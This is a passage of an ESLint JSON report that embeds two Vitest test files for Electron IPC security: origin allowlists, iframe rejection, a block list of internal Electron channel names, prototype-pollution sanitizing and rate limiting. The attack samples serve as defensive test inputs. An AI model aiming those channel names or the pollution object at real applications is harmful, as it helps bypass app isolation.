type.","line":498,"column":76,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":498,"endColumn":84}],"suppressedMessages":[],"errorCount":9,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Cross-Process Communication Security Tests (2025)\n * \n * Comprehensive testing of IPC security boundaries, sender validation,\n * and cross-process communication patterns following 2025 best practices.\n */\n\nimport { describe, test, expect, beforeEach, vi } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { ipcMain, BrowserWindow } from 'electron'\nimport { } from 'events'\n\n// Mock electron modules for cross-process testing\nvi.mock('electron', () => ({\n  ipcMain: {\n    handle: vi.fn(),\n    on: vi.fn(),\n    once: vi.fn(),\n    removeHandler: vi.fn(),\n    removeAllListeners: vi.fn(),\n    removeListener: vi.fn(),\n    _handlers: new Map(),\n    _listeners: new Map()\n  },\n  BrowserWindow: {\n    getAllWindows: vi.fn().mockReturnValue([]),\n    getFocusedWindow: vi.fn(),\n    fromWebContents: vi.fn()\n  },\n  webContents: {\n    getAllWebContents: vi.fn().mockReturnValue([]),\n    fromId: vi.fn()\n  },\n  app: {\n    isPackaged: false,\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`)\n  }\n}))\n\n// Mock URL for sender validation\n(global as any).URL = class MockURL {\n  public origin: string\n  public protocol: string\n  public hostname: string\n  \n  constructor(url: string) {\n    if (url.startsWith('https://app.taskmaster.com')) {\n      this.origin = 'https://app.taskmaster.com'\n      this.protocol = 'https:'\n      this.hostname = 'app.taskmaster.com'\n    } else if (url.startsWith('app://taskmaster')) {\n      this.origin = 'app://taskmaster'\n      this.protocol = 'app:'\n      this.hostname = 'taskmaster'\n    } else if (url.startsWith('https://evil.com')) {\n      this.origin = 'https://evil.com'\n      this.protocol = 'https:'\n      this.hostname = 'evil.com'\n    } else {\n      throw new Error('Invalid URL')\n    }\n  }\n}\n\ndescribe('Cross-Process Communication Security Tests (2025)', () => {\n  beforeEach(() => {\n    vi.clearAllMocks()\n    ;(ipcMain as any)._handlers?.clear?.()\n    ;(ipcMain as any)._listeners?.clear?.()\n  })\n\n  describe('IPC Sender Validation', () => {\n    test('should validate sender frame URL against allowlist', () => {\n      const validateSender = (frame: any, allowedOrigins: string[] = []) => {\n        if (!frame) return { valid: false, reason: 'No sender frame' }\n        \n        try {\n          const frameUrl = new URL(frame.url)\n          \n          // Check if frame is from iframe\n          if (frame.parent && frame.parent !== frame) {\n            return { valid: false, reason: 'IPC from iframe not allowed', origin: frameUrl.origin }\n          }\n          \n          // Check allowed origins\n          if (allowedOrigins.length > 0 && !allowedOrigins.includes(frameUrl.origin)) {\n            return { valid: false, reason: 'Origin not in allowlist', origin: frameUrl.origin }\n          }\n          \n          return { valid: true, origin: frameUrl.origin }\n        } catch {\n          return { valid: false, reason: 'Invalid sender URL' }\n        }\n      }\n      \n      const allowedOrigins = ['https://app.taskmaster.com', 'app://taskmaster']\n      \n      // Valid origins\n      expect(validateSender(\n        { url: 'https://app.taskmaster.com/main' },\n        allowedOrigins\n      )).toEqual({ valid: true, origin: 'https://app.taskmaster.com' })\n      \n      expect(validateSender(\n        { url: 'app://taskmaster/index.html' },\n        allowedOrigins\n      )).toEqual({ valid: true, origin: 'app://taskmaster' })\n      \n      // Invalid origin\n      expect(validateSender(\n        { url: 'https://evil.com/attack' },\n        allowedOrigins\n      )).toEqual({\n        valid: false,\n        reason: 'Origin not in allowlist',\n        origin: 'https://evil.com'\n      })\n      \n      // Iframe attempt\n      expect(validateSender(\n        {\n          url: 'https://app.taskmaster.com/iframe',\n          parent: { url: 'https://app.taskmaster.com/main' }\n        },\n        allowedOrigins\n      )).toEqual({\n        valid: false,\n        reason: 'IPC from iframe not allowed',\n        origin: 'https://app.taskmaster.com'\n      })\n      \n      // No frame\n      expect(validateSender(null, allowedOrigins)).toEqual({\n        valid: false,\n        reason: 'No sender frame'\n      })\n    })\n\n    test('should validate sender window registration', () => {\n      const mockWindows = [\n        { id: 1, webContents: { id: 101 } },\n        { id: 2, webContents: { id: 102 } },\n        { id: 3, webContents: { id: 103 } }\n      ]\n      \n      ;(BrowserWindow.getAllWindows as any).mockReturnValue(mockWindows)\n      \n      const validateSenderWindow = (senderId: number) => {\n        const windows = BrowserWindow.getAllWindows()\n        return windows.some(win => win.webContents.id === senderId)\n      }\n      \n      // Valid sender IDs\n      expect(validateSenderWindow(101)).toBe(true)\n      expect(validateSenderWindow(102)).toBe(true)\n      expect(validateSenderWindow(103)).toBe(true)\n      \n      // Invalid sender ID\n      expect(validateSenderWindow(999)).toBe(false)\n      expect(validateSenderWindow(0)).toBe(false)\n    })\n\n    test('should prevent channel name manipulation attacks', () => {\n      const secureChannelValidator = (channel: string) => {\n        // Block internal Electron channels\n        const internalPrefixes = [\n          'ELECTRON_BROWSER_',\n          'ELECTRON_RENDERER_',\n          'chrome-',\n          'devtools-',\n          'internal:'\n        ]\n        \n        for (const prefix of internalPrefixes) {\n          if (channel.startsWith(prefix)) {\n            throw new Error(`Access to internal channel denied: ${channel}`)\n          }\n        }\n        \n        // Allowlist approach - only allow specific patterns\n        const allowedPatterns = [\n          /^app:[a-z-]+$/,\n          /^file:[a-z-]+$/,\n          /^dialog:[a-z-]+$/,\n          /^update:[a-z-]+$/\n        ]\n        \n        if (!allowedPatterns.some(pattern => pattern.test(channel))) {\n          throw new Error(`Channel not in allowlist: ${channel}`)\n        }\n        \n        return true\n      }\n      \n      // Valid channels\n      expect(() => secureChannelValidator('app:get-version')).not.toThrow()\n      expect(() => secureChannelValidator('file:read-config')).not.toThrow()\n      expect(() => secureChannelValidator('dialog:show-error')).not.toThrow()\n      \n      // Internal channels\n      expect(() => secureChannelValidator('ELECTRON_BROWSER_REQUIRE'))\n        .toThrow('Access to internal channel denied')\n      expect(() => secureChannelValidator('chrome-devtools'))\n        .toThrow('Access to internal channel denied')\n      \n      // Arbitrary channels\n      expect(() => secureChannelValidator('malicious:command'))\n        .toThrow('Channel not in allowlist')\n      expect(() => secureChannelValidator('app:invalid-action'))\n        .toThrow('Channel not in allowlist')\n    })\n  })\n\n  describe('IPC Security Wrapper Implementation', () => {\n    test('should implement secure IPC handler with full validation', () => {\n      class SecureIPCHandler {\n        private allowedChannels = new Set([\n          'app:get-version',\n          'app:get-platform',\n          'file:read-config',\n          'dialog:show-error'\n        ])\n        \n        private allowedOrigins = [\n          'https://app.taskmaster.com',\n          'app://taskmaster'\n        ]\n        \n        private registeredWindows = new Set<number>()\n        \n        registerWindow(windowId: number) {\n          this.registeredWindows.add(windowId)\n        }\n        \n        unregisterWindow(windowId: number) {\n          this.registeredWindows.delete(windowId)\n        }\n        \n        validateRequest(channel: string, event: any): { valid: boolean; reason?: string } {\n          // 1. Channel validation\n          if (!this.allowedChannels.has(channel)) {\n            return { valid: false, reason: `Channel not allowed: ${channel}` }\n          }\n          \n          // 2. Sender frame validation\n          if (!event.senderFrame) {\n            return { valid: false, reason: 'No sender frame' }\n          }\n          \n          try {\n            const frameUrl = new URL(event.senderFrame.url)\n            \n            // Check iframe restriction\n            if (event.senderFrame.parent && event.senderFrame.parent !== event.senderFrame) {\n              return { valid: false, reason: 'IPC from iframe not allowed' }\n            }\n            \n            // Check origin allowlist\n            if (!this.allowedOrigins.includes(frameUrl.origin)) {\n              return { valid: false, reason: `Origin not allowed: ${frameUrl.origin}` }\n            }\n          } catch {\n            return { valid: false, reason: 'Invalid sender URL' }\n          }\n          \n          // 3. Window registration validation\n          if (!this.registeredWindows.has(event.sender.id)) {\n            return { valid: false, reason: 'Sender window not registered' }\n          }\n          \n          return { valid: true }\n        }\n        \n        secureHandle(channel: string, handler: Function) {\n          const secureHandler = async (event: any, ...args: any[]) => {\n            const validation = this.validateRequest(channel, event)\n            if (!validation.valid) {\n              throw new Error(`IPC Security Error: ${validation.reason}`)\n            }\n            \n            return await handler(event, ...args)\n          }\n          \n          ipcMain.handle(channel, secureHandler)\n          return secureHandler\n        }\n      }\n      \n      const secureIPC = new SecureIPCHandler()\n      const mockHandler = vi.fn().mockResolvedValue('success')\n      \n      // Register a window\n      secureIPC.registerWindow(101)\n      \n      // Create secure handler\n      const handler = secureIPC.secureHandle('app:get-version', mockHandler)\n      \n      // Valid request\n      const validEvent = {\n        senderFrame: { url: 'https://app.taskmaster.com/main' },\n        sender: { id: 101 }\n      }\n      \n      expect(handler(validEvent)).resolves.toBe('success')\n      \n      // Invalid origin\n      const invalidOriginEvent = {\n        senderFrame: { url: 'https://evil.com/attack' },\n        sender: { id: 101 }\n      }\n      \n      expect(handler(invalidOriginEvent)).rejects.toThrow('Origin not allowed')\n      \n      // Iframe attempt\n      const iframeEvent = {\n        senderFrame: {\n          url: 'https://app.taskmaster.com/iframe',\n          parent: { url: 'https://app.taskmaster.com/main' }\n        },\n        sender: { id: 101 }\n      }\n      \n      expect(handler(iframeEvent)).rejects.toThrow('IPC from iframe not allowed')\n      \n      // Unregistered window\n      const unregisteredEvent = {\n        senderFrame: { url: 'https://app.taskmaster.com/main' },\n        sender: { id: 999 }\n      }\n      \n      expect(handler(unregisteredEvent)).rejects.toThrow('Sender window not registered')\n    })\n  })\n\n  describe('Cross-Process Message Filtering', () => {\n    test('should filter sensitive data from IPC messages', () => {\n      const sanitizeIPCData = (data: any): any => {\n        if (data === null || data === undefined) {\n          return data\n        }\n        \n        if (typeof data === 'object') {\n          // Remove potentially dangerous properties\n          const dangerous = ['__proto__', 'constructor', 'prototype']\n          const cleaned = { ...data }\n          \n          for (const prop of dangerous) {\n            delete cleaned[prop]\n          }\n          \n          // Recursively clean nested objects\n          for (const [key, value] of Object.entries(cleaned)) {\n            if (typeof value === 'object' && value !== null) {\n              cleaned[key] = sanitizeIPCData(value)\n            }\n          }\n          \n          return cleaned\n        }\n        \n        return data\n      }\n      \n      // Test basic sanitization\n      const clean = sanitizeIPCData({ name: 'test', value: 123 })\n      expect(clean).toEqual({ name: 'test', value: 123 })\n      \n      // Test prototype pollution prevention\n      const polluted = {\n        data: 'safe',\n        __proto__: { isAdmin: true },\n        constructor: { prototype: { polluted: true } }\n      }\n      \n      const sanitized = sanitizeIPCData(polluted)\n      expect(sanitized).toEqual({ data: 'safe' })\n      expect(sanitized.__proto__).toBeUndefined()\n      expect(sanitized.constructor).toBeUndefined()\n      \n      // Test nested object cleaning\n      const nested = {\n        level1: {\n          level2: {\n            data: 'safe',\n            __proto__: { malicious: true }\n          }\n        }\n      }\n      \n      const cleanedNested = sanitizeIPCData(nested)\n      expect(cleanedNested.level1.level2).toEqual({ data: 'safe' })\n    })\n\n    test('should validate IPC message structure', () => {\n      const validateIPCMessage = (message: any) => {\n        const errors: string[] = []\n        \n        // Check message size\n        const serialized = JSON.stringify(message)\n        if (serialized.length > 1024 * 1024) { // 1MB limit\n          errors.push('Message too large')\n        }\n        \n        // Check for circular references\n        try {\n          JSON.stringify(message)\n        } catch (error) {\n          if (error instanceof TypeError && error.message.includes('circular')) {\n            errors.push('Circular reference detected')\n          }\n        }\n        \n        // Check for functions (shouldn't be serializable)\n        const hasFunction = (obj: any): boolean => {\n          if (typeof obj === 'function') return true\n          if (typeof obj === 'object' && obj !== null) {\n            return Object.values(obj).some(hasFunction)\n          }\n          return false\n        }\n        \n        if (hasFunction(message)) {\n          errors.push('Functions not allowed in IPC messages')\n        }\n        \n        return { valid: errors.length === 0, errors }\n      }\n      \n      // Valid message\n      expect(validateIPCMessage({ data: 'test', count: 123 }))\n        .toEqual({ valid: true, errors: [] })\n      \n      // Message with function\n      expect(validateIPCMessage({ callback: () => {} }))\n        .toEqual({ valid: false, errors: ['Functions not allowed in IPC messages'] })\n      \n      // Circular reference\n      const circular: any = { name: 'test' }\n      circular.self = circular\n      \n      expect(validateIPCMessage(circular))\n        .toEqual({ valid: false, errors: ['Circular reference detected'] })\n    })\n  })\n\n  describe('Event Object Security', () => {\n    test('should prevent event object leakage in renderer callbacks', () => {\n      // Simulate secure event wrapper\n      const createSecureCallback = (userCallback: Function) => {\n        return (_event: any, ...data: any[]) => {\n          // Never pass the event object to user callback\n          // Only pass the actual data\n          userCallback(...data)\n        }\n      }\n      \n      const userCallback = vi.fn()\n      const secureWrapper = createSecureCallback(userCallback)\n      \n      const sensitiveEvent = {\n        sender: { id: 1, session: 'sensitive-data' },\n        senderFrame: { url: 'app://internal', routingId: 123 },\n        ports: [],\n        processId: 999\n      }\n      \n      const safeData = { progress: 50, status: 'downloading' }\n      \n      // Call the wrapper\n      secureWrapper(sensitiveEvent, safeData)\n      \n      // Verify user callback only received safe data\n      expect(userCallback).toHaveBeenCalledWith(safeData)\n      expect(userCallback).not.toHaveBeenCalledWith(sensitiveEvent, safeData)\n      \n      // Verify no access to sensitive properties\n      const callArgs = userCallback.mock.calls[0]\n      expect(callArgs).toBeDefined()\n      expect(callArgs).toEqual([safeData])\n      expect(callArgs?.[0]).not.toHaveProperty('sender')\n      expect(callArgs?.[0]).not.toHaveProperty('senderFrame')\n    })\n\n    test('should validate event data structure before passing to callbacks', () => {\n      const createValidatingCallback = (userCallback: Function, validator: Function) => {\n        return (_event: any, data: any) => {\n          if (validator(data)) {\n            userCallback(data)\n          } else {\n            console.warn('Invalid event data structure, callback not invoked')\n          }\n        }\n      }\n      \n      const progressValidator = (data: any) => {\n        return data &&\n          typeof data === 'object' &&\n          typeof data.percent === 'number' &&\n          typeof data.transferred === 'number' &&\n          typeof data.total === 'number' &&\n          data.percent >= 0 &&\n          data.percent <= 100 &&\n          data.transferred >= 0 &&\n          data.total >= 0\n      }\n      \n      const userCallback = vi.fn()\n      const validatingCallback = createValidatingCallback(userCallback, progressValidator)\n      \n      // Valid data\n      const validData = { percent: 50, transferred: 5000, total: 10000 }\n      validatingCallback(null, validData)\n      expect(userCallback).toHaveBeenCalledWith(validData)\n      \n      userCallback.mockClear()\n      \n      // Invalid data\n      const invalidData = { percent: -1, transferred: 'invalid', total: 10000 }\n      validatingCallback(null, invalidData)\n      expect(userCallback).not.toHaveBeenCalled()\n      \n      // Missing fields\n      validatingCallback(null, { percent: 50 })\n      expect(userCallback).not.toHaveBeenCalled()\n    })\n  })\n\n  describe('Rate Limiting and DoS Prevention', () => {\n    test('should implement per-sender rate limiting', () => {\n      class IPCRateLimiter {\n        private senderLimits = new Map<string, { count: number; resetTime: number }>()\n        private readonly maxRequests = 10\n        private readonly windowMs = 1000\n        \n        checkLimit(senderId: string): boolean {\n          const now = Date.now()\n          const senderKey = `sender:${senderId}`\n          const current = this.senderLimits.get(senderKey)\n          \n          if (!current || now > current.resetTime) {\n            this.senderLimits.set(senderKey, { count: 1, resetTime: now + this.windowMs })\n            return true\n          }\n          \n          if (current.count >= this.maxRequests) {\n            return false\n          }\n          \n          current.count++\n          return true\n        }\n      }\n      \n      const rateLimiter = new IPCRateLimiter()\n      \n      // First 10 requests should pass\n      for (let i = 0; i < 10; i++) {\n        expect(rateLimiter.checkLimit('sender1')).toBe(true)\n      }\n      \n      // 11th request should fail\n      expect(rateLimiter.checkLimit('sender1')).toBe(false)\n      \n      // Different sender should have own limit\n      expect(rateLimiter.checkLimit('sender2')).toBe(true)\n    })\n\n    test('should detect and prevent IPC flooding attacks', () => {\n      class FloodDetector {\n        private requestTimes = new Map<string, number[]>()\n        private readonly floodThreshold = 100 // requests per second\n        private readonly blacklist = new Set<string>()\n        \n        detectFlood(senderId: string): boolean {\n          if (this.blacklist.has(senderId)) {\n            return true // Already blacklisted\n          }\n          \n          const now = Date.now()\n          const times = this.requestTimes.get(senderId) || []\n          \n          // Remove old timestamps (older than 1 second)\n          const recentTimes = times.filter(time => now - time < 1000)\n          recentTimes.push(now)\n          \n          this.requestTimes.set(senderId, recentTimes)\n          \n          if (recentTimes.length > this.floodThreshold) {\n            this.blacklist.add(senderId)\n            console.warn(`Flooding detected from sender ${senderId}, blacklisted`)\n            return true\n          }\n          \n          return false\n        }\n        \n        isBlacklisted(senderId: string): boolean {\n          return this.blacklist.has(senderId)\n        }\n      }\n      \n      const detector = new FloodDetector()\n      \n      // Normal usage - should not trigger flood detection\n      for (let i = 0; i < 50; i++) {\n        expect(detector.detectFlood('normal-sender')).toBe(false)\n      }\n      \n      // Flood attack - should trigger detection\n      for (let i = 0; i < 150; i++) {\n        if (i < 100) {\n          expect(detector.detectFlood('attacker')).toBe(false)\n        } else {\n          expect(detector.detectFlood('attacker')).toBe(true)\n          break\n        }\n      }\n      \n      expect(detector.isBlacklisted('attacker')).toBe(true)\n      expect(detector.isBlacklisted('normal-sender')).toBe(false)\n    })\n  })\n\n  describe('Process Isolation Validation', () => {\n    test('should verify process boundaries are maintained', () => {\n      // Simulate checking process isolation\n      const validateProcessIsolation = () => {\n        const violations: string[] = []\n        \n        // Check that main process APIs are not accessible from renderer\n        if (typeof process !== 'undefined') {\n          if (process.type === 'renderer') {\n            // In renderer process\n            if (typeof require !== 'undefined') {\n              // require should only be available in preload, not in renderer context\n              violations.push('require available in renderer context')\n            }\n            \n            if (typeof global !== 'undefined' && global.process) {\n              violations.push('global.process available in renderer')\n            }\n            \n            if (typeof Buffer !== 'undefined') {\n              violations.push('Buffer available in renderer context')\n            }\n          }\n        }\n        \n        return { isolated: violations.length === 0, violations }\n      }\n      \n      // Mock renderer environment\n      const originalProcess = process\n      ;(global as any).process = { type: 'renderer' }\n      \n      const result = validateProcessIsolation()\n      \n      // In test environment, these might be available, but in production they shouldn't be\n      expect(result).toHaveProperty('isolated')\n      expect(result).toHaveProperty('violations')\n      expect(Array.isArray(result.violations)).toBe(true)\n      \n      // Restore original process\n      ;(global as any).process = originalProcess\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/__tests__/ipc-security.test.ts","messages":[{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return type.","line":553,"column":50,"nodeType":"Identifier","messageId":"bannedFunctionType","endLine":553,"endColumn":58}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * IPC Security and Rate Limiting Tests (2025)\n * \n * Comprehensive security tests for Electron IPC including sender validation,\n * rate limiting, DDoS prevention, and context isolation following 2025 best practices.\n * Based on research findings from ELECTRON_IPC_SECURITY_2025.md\n */\n\nimport { describe, test, expect, beforeEach, vi, beforeAll } from 'vitest'\n\n// Global type declarations for test environment\ndeclare global {\n  const vi: typeof import('vitest').vi\n  interface GlobalThis {\n    __mockElectron?: any\n    __electron?: any\n    electronAPI?: any\n    taskmaster?: any\n    __DEV__?: boolean\n    __TEST__?: boolean\n  }\n}\n\nimport { ipcMain, BrowserWindow } from 'electron'\nimport { } from 'events'\nimport { URL } from 'url'\n\n// Mock security modules\nimport { IPCRateLimiter } from '../security/ipc-rate-limiter'\nimport { SecureIPCHandler } from '../security/secure-ipc-handler'\nimport { SecurityMonitor } from '../security/security-monitor'\n\n// Mock Electron modules\nvi.mock('electron', () => ({\n  ipcMain: {\n    handle: vi.fn(),\n    on: vi.fn(),\n    removeHandler: vi.fn(),\n    removeAllListeners: vi.fn(),\n    _handlers: new Map()\n  },\n  BrowserWindow: {\n    getAllWindows: vi.fn().mockReturnValue([]),\n    getFocusedWindow: vi.fn(),\n    fromWebContents: vi.fn()\n  },\n  app: {\n    getPath: vi.fn().mockImplementation((name) => `/mock/path/${name}`),\n    isPackaged: true\n  },\n  session: {\n    defaultSession: {\n      setPermissionRequestHandler: vi.fn(),\n      setCertificateVerifyProc: vi.fn()\n    }\n  }\n}))\n\n// Mock security utilities\nvi.mock('../security/ipc-rate-limiter')\nvi.mock('../security/secure-ipc-handler')\nvi.mock('../security/security-monitor')\n\ndescribe('IPC Security Tests', () => {\n  let secureHandler: typeof SecureIPCHandler.prototype\n  let rateLimiter: typeof IPCRateLimiter.prototype\n  let securityMonitor: typeof SecurityMonitor.prototype\n  \n  beforeAll(() => {\n    // Initialize security components\n    secureHandler = new (SecureIPCHandler as any)()\n    rateLimiter = new (IPCRateLimiter as any)()\n    securityMonitor = new (SecurityMonitor as any)()\n  })\n\n  beforeEach(() => {\n    vi.clearAllMocks()\n    // Clear any registered handlers\n    ;(ipcMain as any)._handlers?.clear?.()\n  })\n\n  describe('IPC Sender Validation', () => {\n    test('should validate sender frame URL against allowlist', async () => {\n      const mockEvent = {\n        senderFrame: { \n          url: 'https://evil.com/attack',\n          frameId: 1\n        },\n        sender: { \n          id: 1,\n          getURL: () => 'https://evil.com/attack'\n        }\n      }\n\n      // Register secure handler with allowlist\n      secureHandler.handle('secure:operation', {\n        allowedOrigins: ['https://app.taskmaster.com', 'app://taskmaster'],\n        requireAuth: true\n      }, async () => 'success')\n\n      // Mock the handler registration\n      const handler = vi.fn().mockImplementation(async (event, ..._args) => {\n        const allowedOrigins = ['https://app.taskmaster.com', 'app://taskmaster']\n        try {\n          const frameUrl = new URL(event.senderFrame.url)\n          if (!allowedOrigins.includes(frameUrl.origin)) {\n            throw new Error('Unauthorized sender')\n          }\n          return 'success'\n        } catch {\n          throw new Error('Unauthorized sender')\n        }\n      })\n\n      ipcMain.handle('secure:operation', handler)\n      ;(ipcMain as any)._handlers?.set?.('secure:operation', handler)\n\n      // Test with unauthorized sender\n      await expect(handler(mockEvent)).rejects.toThrow('Unauthorized sender')\n\n      // Test with authorized sender\n      const authorizedEvent = {\n        ...mockEvent,\n        senderFrame: { url: 'https://app.taskmaster.com/page' }\n      }\n      await expect(handler(authorizedEvent)).resolves.toBe('success')\n    })\n\n    test('should reject requests from malicious iframes', async () => {\n      const maliciousIframeEvent = {\n        senderFrame: {\n          url: 'https://malicious-site.com/iframe',\n          frameId: 2,\n          parent: {\n            url: 'https://app.taskmaster.com',\n            frameId: 1\n          }\n        },\n        sender: { id: 1 }\n      }\n\n      const handler = vi.fn().mockImplementation(async (event) => {\n        // Check if sender is a top-level frame\n        if (event.senderFrame.parent) {\n          throw new Error('IPC from iframe not allowed')\n        }\n        return 'success'\n      })\n\n      ipcMain.handle('sensitive:data', handler)\n\n      await expect(handler(maliciousIframeEvent)).rejects.toThrow('IPC from iframe not allowed')\n    })\n\n    test('should validate sender ID matches registered window', async () => {\n      const mockWindows = [\n        { webContents: { id: 1 }, id: 1 },\n        { webContents: { id: 2 }, id: 2 }\n      ]\n      \n      ;(BrowserWindow.getAllWindows as any).mockReturnValue(mockWindows)\n\n      const validateSenderWindow = (senderId: number): boolean => {\n        const windows = BrowserWindow.getAllWindows()\n        return windows.some(win => win.webContents.id === senderId)\n      }\n\n      expect(validateSenderWindow(1)).toBe(true)\n      expect(validateSenderWindow(999)).toBe(false)\n    })\n\n    test('should prevent spoofing attacks via channel manipulation', async () => {\n      // Test for CVE-like vulnerability where internal channels can be accessed\n      const internalChannels = [\n        'ELECTRON_BROWSER_REQUIRE',\n        'ELECTRON_BROWSER_GET_BUILTIN',\n        'ELECTRON_BROWSER_MEMBER_GET',\n        'ELECTRON_BROWSER_MEMBER_SET',\n        'ELECTRON_BROWSER_MEMBER_CALL'\n      ]\n\n      const handler = vi.fn().mockImplementation((channel, callback) => {\n        // Security check: block internal Electron channels\n        if (channel.startsWith('ELECTRON_')) {\n          throw new Error('Access to internal channels denied')\n        }\n        return callback\n      })\n\n      for (const channel of internalChannels) {\n        expect(() => handler(channel, () => {})).toThrow('Access to internal channels denied')\n      }\n    })\n  })\n\n  describe('Rate Limiting Tests', () => {\n    test('should enforce rate limits per channel', async () => {\n      // Configure rate limiter\n      rateLimiter.setLimit = vi.fn()\n      rateLimiter.checkLimit = vi.fn()\n        .mockReturnValueOnce(true)  // First request passes\n        .mockReturnValueOnce(true)  // Second request passes\n        .mockReturnValueOnce(false) // Third request blocked\n\n      rateLimiter.setLimit('api:query', 2, 1000) // 2 requests per second\n\n      const handler = vi.fn().mockImplementation(async (event) => {\n        if (!rateLimiter.checkLimit('api:query', event.sender.id)) {\n          throw new Error('Rate limit exceeded')\n        }\n        return { data: 'success' }\n      })\n\n      const mockEvent = { sender: { id: 1 } }\n\n      // First two requests should succeed\n      await expect(handler(mockEvent)).resolves.toEqual({ data: 'success' })\n      await expect(handler(mockEvent)).resolves.toEqual({ data: 'success' })\n\n      // Third request should be rate limited\n      await expect(handler(mockEvent)).rejects.toThrow('Rate limit exceeded')\n    })\n\n    test('should implement sliding window rate limiting', async () => {\n      const slidingWindow = {\n        requests: new Map<string, number[]>(),\n        checkLimit(key: string, limit: number, windowMs: number): boolean {\n          const now = Date.now()\n          const timestamps = this.requests.get(key) || []\n          \n          // Remove old timestamps outside window\n          const validTimestamps = timestamps.filter(t => now - t < windowMs)\n          \n          if (validTimestamps.length >= limit) {\n            return false\n          }\n          \n          validTimestamps.push(now)\n          this.requests.set(key, validTimestamps)\n          return true\n        }\n      }\n\n      const key = 'user:1:api:query'\n      \n      // Simulate requests\n      expect(slidingWindow.checkLimit(key, 3, 1000)).toBe(true)  // Request 1\n      expect(slidingWindow.checkLimit(key, 3, 1000)).toBe(true)  // Request 2\n      expect(slidingWindow.checkLimit(key, 3, 1000)).toBe(true)  // Request 3\n      expect(slidingWindow.checkLimit(key, 3, 1000)).toBe(false) // Request 4 - blocked\n      \n      // Wait for window to slide\n      await new Promise(resolve => setTimeout(resolve, 1100))\n      expect(slidingWindow.checkLimit(key, 3, 1000)).toBe(true)  // Request 5 - allowed\n    })\n\n    test('should handle burst traffic patterns', async () => {\n      const tokenBucket = {\n        buckets: new Map<string, { tokens: number; lastRefill: number }>(),\n        capacity: 10,\n        refillRate: 5, // tokens per second\n        \n        consume(key: string, tokens: number = 1): boolean {\n          const now = Date.now()\n          let bucket = this.buckets.get(key)\n          \n          if (!bucket) {\n            bucket = { tokens: this.capacity, lastRefill: now }\n            this.buckets.set(key, bucket)\n          }\n          \n          // Refill tokens based on time elapsed\n          const elapsed = (now - bucket.lastRefill) / 1000\n          const tokensToAdd = elapsed * this.refillRate\n          bucket.tokens = Math.min(this.capacity, bucket.tokens + tokensToAdd)\n          bucket.lastRefill = now\n          \n          if (bucket.tokens >= tokens) {\n            bucket.tokens -= tokens\n            return true\n          }\n          \n          return false\n        }\n      }\n\n      const key = 'user:1'\n      \n      // Burst of 10 requests should succeed (full bucket)\n      for (let i = 0; i < 10; i++) {\n        expect(tokenBucket.consume(key)).toBe(true)\n      }\n      \n      // 11th request should fail\n      expect(tokenBucket.consume(key)).toBe(false)\n      \n      // Wait for tokens to refill\n      await new Promise(resolve => setTimeout(resolve, 200)) // 0.2s = 1 token\n      expect(tokenBucket.consume(key)).toBe(true)\n    })\n\n    test('should differentiate rate limits by user and channel', async () => {\n      const multiKeyRateLimiter = {\n        limits: new Map<string, { count: number; resetTime: number }>(),\n        \n        checkLimit(userId: string, channel: string, limit: number, windowMs: number): boolean {\n          const key = `${userId}:${channel}`\n          const now = Date.now()\n          const record = this.limits.get(key)\n          \n          if (!record || now > record.resetTime) {\n            this.limits.set(key, { count: 1, resetTime: now + windowMs })\n            return true\n          }\n          \n          if (record.count >= limit) {\n            return false\n          }\n          \n          record.count++\n          return true\n        }\n      }\n\n      // Different users should have separate limits\n      expect(multiKeyRateLimiter.checkLimit('user1', 'api:query', 2, 1000)).toBe(true)\n      expect(multiKeyRateLimiter.checkLimit('user1', 'api:query', 2, 1000)).toBe(true)\n      expect(multiKeyRateLimiter.checkLimit('user1', 'api:query', 2, 1000)).toBe(false)\n      \n      // user2 should have their own limit\n      expect(multiKeyRateLimiter.checkLimit('user2', 'api:query', 2, 1000)).toBe(true)\n      \n      // Different channels should have separate limits\n      expect(multiKeyRateLimiter.checkLimit('user1', 'api:write', 2, 1000)).toBe(true)\n    })\n  })\n\n  describe('DDoS Prevention Tests', () => {\n    test('should detect and block IPC flooding attacks', async () => {\n      const floodDetector = {\n        requestCounts: new Map<string, number>(),\n        thresholds: { perSecond: 100, perMinute: 1000 },\n        blacklist: new Set<string>(),\n        \n        detectFlood(senderId: string): boolean {\n          const key = `${senderId}:${Math.floor(Date.now() / 1000)}`\n          const count = (this.requestCounts.get(key) || 0) + 1\n          this.requestCounts.set(key, count)\n          \n          if (count > this.thresholds.perSecond) {\n            this.blacklist.add(senderId)\n            return true\n          }\n          \n          return false\n        },\n        \n        isBlacklisted(senderId: string): boolean {\n          return this.blacklist.has(senderId)\n        }\n      }\n\n      const senderId = 'attacker-1'\n      \n      // Simulate flood attack\n      for (let i = 0; i < 150; i++) {\n        if (i < 100) {\n          expect(floodDetector.detectFlood(senderId)).toBe(false)\n        } else {\n          expect(floodDetector.detectFlood(senderId)).toBe(true)\n          break\n        }\n      }\n      \n      expect(floodDetector.isBlacklisted(senderId)).toBe(true)\n    })\n\n    test('should implement connection throttling', async () => {\n      const connectionManager = {\n        connections: new Map<string, { count: number; firstSeen: number }>(),\n        maxConnectionsPerIP: 10,\n        \n        acceptConnection(ip: string): boolean {\n          const conn = this.connections.get(ip)\n          \n          if (!conn) {\n            this.connections.set(ip, { count: 1, firstSeen: Date.now() })\n            return true\n          }\n          \n          if (conn.count >= this.maxConnectionsPerIP) {\n            return false\n          }\n          \n          conn.count++\n          return true\n        },\n        \n        releaseConnection(ip: string): void {\n          const conn = this.connections.get(ip)\n          if (conn && conn.count > 0) {\n            conn.count--\n          }\n        }\n      }\n\n      const attackerIP = '192.168.1.100'\n      \n      // Accept up to max connections\n      for (let i = 0; i < 10; i++) {\n        expect(connectionManager.acceptConnection(attackerIP)).toBe(true)\n      }\n      \n      // Reject additional connections\n      